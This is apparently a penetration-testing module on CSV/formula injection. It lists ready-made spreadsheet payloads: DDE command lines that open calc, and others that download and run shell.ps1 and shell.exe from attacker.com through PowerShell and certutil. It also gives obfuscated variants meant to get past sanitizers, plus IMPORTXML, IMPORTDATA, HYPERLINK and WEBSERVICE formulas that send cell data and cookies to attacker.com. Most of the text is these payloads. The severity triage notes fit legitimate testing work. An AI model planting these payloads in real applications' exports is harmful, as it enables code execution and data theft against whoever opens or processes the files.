# VULN MODULE — CSV Injection (Formula Injection)
# Asset: webapp
# CWE-1236 | Report prefix: WEB-CSV

## THREAT MODEL

CSV injection (also: formula injection, XSLX injection) occurs when user input
containing spreadsheet formula prefixes (`=`, `+`, `-`, `@`) is embedded in a
CSV or Excel export without sanitization. When opened in a spreadsheet application,
the formula executes in the victim's context — enabling RCE on Windows (via DDE/
PowerShell), data exfiltration to attacker-controlled servers, or privilege escalation.

Attack surface:
- Any export feature generating CSV, XLS, XLSX, or TSV files
- Admin panels exporting user data (name, email, address, comments)
- Audit logs, support ticket exports, report generators
- Any field populated by user-controlled data that is later exported

## VULNERABILITY CLASSES

1. DDE RCE              CWE-1236 — Dynamic Data Exchange command execution (Windows Excel)
2. IMPORTXML exfiltration CWE-1236 — Google Sheets OOB data fetch
3. Hyperlink injection    CWE-1236 — `=HYPERLINK()` redirects victim
4. Macro execution        CWE-1236 — LibreOffice macro via formula
5. Privilege escalation   CWE-1236 — exported admin data processed by automated system

## DETECTION — PROBE PAYLOADS

Inject into any field that may appear in a CSV export:

```
=1+1
=SUM(1,2)
=1/0
+cmd|'/C calc'!A0
@SUM(1,1)
```

Any spreadsheet-aware response (formula result, error dialog, calculator opening)
confirms CSV injection. For server-side processing, use OOB callbacks.

## DDE PAYLOADS (Windows — Excel / LibreOffice)

### Basic DDE — open Calculator
```
=cmd|'/C calc'!A0
=cmd|'/C powershell Start-Process calc'!A0
```

### DDE — Download and execute payload
```
=cmd|'/C powershell IEX (New-Object Net.WebClient).DownloadString("http://attacker.com/shell.ps1")'!A0
=cmd|'/C certutil -urlcache -split -f http://attacker.com/shell.exe C:\Temp\s.exe && C:\Temp\s.exe'!A0
```

### DDE via rundll32
```
=rundll32|'C:\windows\system32\advpack.dll,LaunchINFSection C:\windows\Desktop\test.inf,DefaultInstall'!A0
```

### Obfuscated payloads (bypass naive CSV sanitizers)

#### Concat to rebuild formula
```
=CONCATENATE(CHAR(61),CHAR(99),CHAR(109),CHAR(100))
```

#### Using string literals across cells
```
="="&"cmd|'/C calc'!A0"
```

#### Plus/minus prefix variants
```
+cmd|'/C calc'!A0
-2+3+cmd|'/C calc'!A0
@cmd|'/C calc'!A0
```

#### Tab/newline obfuscation
```
=cmd	|'/C calc'!A0
```

#### With leading quotes (try both)
```
",=cmd|'/C calc'!A0"
'=cmd|'/C calc'!A0
```

## GOOGLE SHEETS — IMPORTXML EXFILTRATION (No user interaction required)

When a victim imports the file into Google Sheets, IMPORTXML executes server-side
and sends a DNS/HTTP request to attacker's server:

```
=IMPORTXML(CONCAT("http://attacker.com/collect?data=",CONCATENATE(A2:E2)),"/")
=IMPORTDATA("http://attacker.com/collect?sheet="&CELL("address",A1))
=IMPORTFEED("http://attacker.com/collect?q="&A1)
```

These formulas exfiltrate spreadsheet content (other cells, user data) to attacker's
HTTP server when the file is opened in Google Sheets. No Windows required.

## HYPERLINK INJECTION

```
=HYPERLINK("http://attacker.com/phishing","Click here to confirm your account")
=HYPERLINK("javascript:fetch('http://attacker.com/?c='+document.cookie)")
```

Victim sees a clickable link in their spreadsheet; clicking redirects to attacker.

## LIBREOFFICE / OPENOFFICE MACRO

```
=WEBSERVICE("http://attacker.com/exfil?data="&A1)
=DDE("cmd","/C calc","")
```

## IMPACT ESCALATION

### When exported data is processed server-side (highest impact)

If an admin exports a report and the file is then imported into another internal
system (ETL pipeline, finance system, automation), DDE/formula execution happens
in the server context, not the victim's browser.

Mark as **Critical** if:
- The field is in an automated processing pipeline
- Export is consumed by a privileged service account

### Impact ladder
- Exported to Google Sheets → IMPORTXML exfil → **High** (no victim interaction)
- Exported to local Excel/LibreOffice → DDE popup → **Medium** (requires victim to click allow)
- Automated import pipeline → DDE/formula execution → **Critical** (no victim needed)

## TRIAGE NOTE

CSV injection requires:
1. Victim opens the file in a spreadsheet application (or it's auto-processed)
2. For DDE: victim clicks "Enable Content" or "Trust" (Excel 2016+ shows warning)
3. For Google Sheets IMPORTXML: no additional interaction — auto-executes on import

Bug bounty programs typically rate this **Medium** if requires user interaction,
**High/Critical** if data is auto-processed by an internal system.

## TOOLS

```bash
# No dedicated tool — manual injection via any form field

# Verify export endpoint:
# Submit payload in user profile name/bio, then trigger export
# Download exported file, inspect raw content with text editor first
# Open in LibreOffice (safer than Excel) with macros disabled to test formula presence

# OOB confirmation (no local app needed):
# Use: =IMPORTXML("http://COLLABORATOR_URL/","//foo")
# Check Burp Collaborator / interactsh for HTTP callback
```
